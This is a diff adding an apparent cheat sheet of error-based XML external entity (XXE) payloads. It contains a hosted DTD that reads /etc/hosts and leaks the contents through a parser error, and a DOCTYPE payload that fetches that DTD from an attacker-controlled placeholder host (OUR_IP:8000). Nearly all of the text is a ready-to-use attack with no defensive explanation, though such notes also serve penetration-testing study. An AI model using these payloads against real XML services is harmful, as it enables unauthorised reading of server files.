@@ -1,0 +1,36 @@
+#################### ERROR BASED XXE ####################
+#################### TRY TO PROVOKE AN ERROR ####################
+<roo> instead of <root>
+&doesnotexist;
+
+
+
+#################### HOSTED DTD FILE PAYLOAD ####################
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+
+
+
+#################### THE PAYLOAD ####################
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %error;
+]>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
